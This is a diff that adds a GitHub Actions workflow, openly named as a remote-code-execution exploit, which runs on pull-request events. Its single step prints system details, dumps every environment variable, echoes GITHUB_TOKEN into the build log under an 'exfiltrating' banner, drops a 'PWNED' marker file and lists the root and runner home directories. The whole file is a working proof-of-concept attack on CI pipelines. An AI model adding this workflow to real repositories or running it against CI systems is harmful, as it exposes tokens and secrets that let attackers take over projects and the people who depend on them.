@@ -1,0 +1,38 @@
+name: RCE-Exploit-Pull-Request
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Repository Code
+        uses: actions/checkout@v4
+
+      - name: Execute Arbitrary Commands and Exfiltrate Secrets
+        run: |
+          echo "-------------------------------------"
+          echo " RCE POOF! YOUR CI IS PWNED, ANALYST! "
+          echo "-------------------------------------"
+          echo "WHOAMI: $(whoami)"
+          echo "CURRENT_DIR: $(pwd)"
+          echo "OS TYPE: $(uname -a)"
+          echo "ENVIRONMENT_VARIABLES:"
+          env
+
+          echo "--- EXFILTRATING GITHUB_TOKEN ---"
+          echo "GITHUB_TOKEN: ${GITHUB_TOKEN}"
+          echo "--- END OF EXFILTRATION ---"
+
+          echo "Creating a clear RCE marker file for visual confirmation:"
+          echo "PWNED BY MRBDZY" > /tmp/RCE_MARKER.txt
+          cat /tmp/RCE_MARKER.txt
+
+          echo "Attempting to list sensitive directories (if permissions allow):"
+          ls -la /
+          ls -la /home/runner/
+          echo "-------------------------------------"
+          echo " RCE DEMONSTRATION COMPLETE "
+          echo "-------------------------------------"
